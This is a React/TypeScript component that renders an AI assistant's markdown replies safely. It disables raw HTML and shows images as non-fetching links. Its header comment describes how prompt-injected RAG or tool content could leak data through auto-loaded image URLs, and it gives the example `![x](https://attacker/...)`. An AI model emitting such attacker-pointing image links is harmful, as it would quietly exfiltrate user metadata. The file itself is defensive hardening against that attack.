"use client";
import { Table, Th, Td } from "../ui/primitives";

/** Assistant-reply markdown, styled with the console's --con-* tokens.
 *
 *  The text is treated as UNTRUSTED (model output can embed RAG/tool content):
 *  - react-markdown does NOT render raw HTML (no rehype-raw), so embedded
 *    HTML/script stays escaped;
 *  - images are rendered as visible, NON-fetching links (see `img` below) —
 *    a real <img> would make the viewer's browser auto-fetch an arbitrary URL
 *    the moment the reply renders, which is a metadata-exfiltration channel
 *    for prompt-injected content (`![x](https://attacker/...)`). Nothing else
 *    react-markdown emits auto-fetches: links/autolinks require a click, and
 *    GFM adds only tables/strikethrough/task-list checkboxes. */

import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

export function AssistantMarkdown({ children }: { children: string }) {
  return (
    <div className="leading-relaxed [&>*:first-child]:mt-0 [&>*:last-child]:mb-0">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          p: (props) => <p className="my-1.5 whitespace-pre-wrap" {...props} />,
          a: ({ href, ...props }) => (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              title={href ? `Opens in a new tab: ${href}` : undefined}
              className="text-[color:var(--con-accent)] underline decoration-dotted underline-offset-2"
              {...props}
            />
          ),
          // SECURITY: never emit a real <img> for untrusted markdown — the
          // browser would auto-fetch the URL on render. Show a click-through
          // link instead so the user decides whether to load it.
          img: ({ src, alt }) => {
            const url = typeof src === "string" ? src.trim() : "";
            const label = `[image${alt ? `: ${alt}` : ""}]`;
            if (!url) return <span className="text-[color:var(--con-faint)]">{label}</span>;
            return (
              <a
                href={url}
                target="_blank"
                rel="noopener noreferrer"
                title={`Image link — not loaded automatically.  Opens in a new tab: ${url}`}
                className="text-[color:var(--con-accent)] underline decoration-dotted underline-offset-2"
              >
                {label}
              </a>
            );
          },
          ul: (props) => <ul className="my-1.5 list-disc space-y-1 pl-5" {...props} />,
          ol: (props) => <ol className="my-1.5 list-decimal space-y-1 pl-5" {...props} />,
          li: (props) => <li className="leading-relaxed" {...props} />,
          strong: (props) => <strong className="font-semibold" {...props} />,
          em: (props) => <em className="italic" {...props} />,
          h1: (props) => <h1 className="mb-1 mt-3 text-[length:var(--con-fs-md)] font-semibold" {...props} />,
          h2: (props) => <h2 className="mb-1 mt-3 text-[length:var(--con-fs-base)] font-semibold" {...props} />,
          h3: (props) => <h3 className="mb-1 mt-2 text-[length:var(--con-fs-base)] font-semibold" {...props} />,
          blockquote: (props) => (
            <blockquote className="my-2 border-l-2 border-[color:var(--con-line-strong)] pl-3 text-[color:var(--con-muted)]" {...props} />
          ),
          hr: () => <hr className="con-hr my-3" />,
          code: ({ className: cls, children: kids, ...props }) => {
            const isBlock = typeof cls === "string" && cls.includes("language-");
            if (isBlock) {
              return (
                <code className="con-mono block overflow-x-auto rounded-control bg-[color:var(--con-surface-3)] p-2 text-[length:var(--con-fs-sm)]" {...props}>
                  {kids}
                </code>
              );
            }
            return (
              <code className="con-mono rounded bg-[color:var(--con-surface-3)] px-1 py-0.5 text-[0.85em]" {...props}>
                {kids}
              </code>
            );
          },
          pre: (props) => <pre className="my-2 overflow-x-auto" {...props} />,
          table: (props) => (
            <div className="my-2 overflow-x-auto">
              <Table caption="Data table" className="w-full border-collapse text-[length:var(--con-fs-xs)]" {...props} />
            </div>
          ),
          tr: (props) => (
            <tr className="transition-colors hover:bg-[color:var(--con-surface-2)] focus-visible:bg-[color:var(--con-surface-2)]" {...props} />
          ),
          th: (props) => <Th className="border border-[color:var(--con-line)] px-2 py-1 text-left font-semibold" {...props} />,
          td: (props) => <Td className="border border-[color:var(--con-line)] px-2 py-1" {...props} />
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
